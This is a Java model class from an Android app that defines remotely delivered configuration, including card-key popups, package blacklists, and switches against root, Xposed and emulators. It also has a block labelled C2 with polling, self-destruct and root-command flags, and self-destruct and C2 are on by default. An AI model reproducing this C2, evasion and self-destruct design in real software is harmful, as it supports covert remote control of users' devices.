package com.example.msphone;

import com.google.gson.annotations.SerializedName;

import java.util.List;

/**
 * 服务端下发的远程配置模型（对应 card_server 的 buildConfig + global_config）。
 * 字段用 @SerializedName 绑定，允许 R8 自由重命名 Java 字段名。
 */
public class RemoteConfig {

    @SerializedName("debug")               public boolean debug;
    @SerializedName("domains")             public List<String> domains;
    @SerializedName("enableHook")          public boolean enableHook;
    @SerializedName("enable_popup_keywords") public boolean enablePopupKeywords;

    // 安全策略开关
    @SerializedName("ban_Root")            public boolean banRoot;
    @SerializedName("ban_Xposed")          public boolean banXposed;
    @SerializedName("ban_Emulator")        public boolean banEmulator;
    @SerializedName("ban_VirtualApp")      public boolean banVirtualApp;
    @SerializedName("ban_DualApp")         public boolean banDualApp;

    @SerializedName("websocket")           public String websocket;

    // 卡密弹窗
    @SerializedName("enablehtmlPopups")    public boolean enableHtmlPopups;
    @SerializedName("htmlpopups")          public List<HtmlPopup> htmlPopups;

    @SerializedName("black_package")       public List<String> blackPackage;
    @SerializedName("new_black_package_list") public List<String> newBlackPackageList;
    @SerializedName("blackActivities")     public List<String> blackActivities;

    // C2 全局/分组/设备级配置（device 接口里随 config 下发）
    @SerializedName("poll_interval")       public Integer pollInterval;
    @SerializedName("enable_c2")           public Boolean enableC2;
    @SerializedName("enable_self_destruct") public Boolean enableSelfDestruct;
    @SerializedName("allow_device_diagnostics") public Boolean allowDeviceDiagnostics;
    @SerializedName("allow_root_commands") public Boolean allowRootCommands;

    public int pollIntervalSeconds() {
        if (pollInterval == null || pollInterval < 5) return 60;
        return pollInterval;
    }

    public boolean c2Enabled() {
        return enableC2 == null || enableC2;
    }

    public boolean selfDestructEnabled() {
        return enableSelfDestruct == null || enableSelfDestruct;
    }

    public boolean diagnosticsEnabled() {
        return allowDeviceDiagnostics != null && allowDeviceDiagnostics;
    }

    public boolean rootCommandsEnabled() {
        return allowRootCommands != null && allowRootCommands;
    }

    public HtmlPopup firstActivePopup() {
        if (htmlPopups == null) return null;
        for (HtmlPopup p : htmlPopups) {
            if (p != null && p.enable && p.html != null && !p.html.isEmpty()) return p;
        }
        return null;
    }

    public static class HtmlPopup {
        @SerializedName("enable")     public boolean enable;
        @SerializedName("id")         public String id;
        @SerializedName("white_list") public List<String> whiteList;
        @SerializedName("black_list") public List<String> blackList;
        @SerializedName("html")       public String html;
        @SerializedName("lock")       public boolean lock;
        @SerializedName("other")      public PopupOther other;
    }

    public static class PopupOther {
        @SerializedName("verifyUrl")     public String verifyUrl;
        @SerializedName("version_shell") public String versionShell;
    }
}
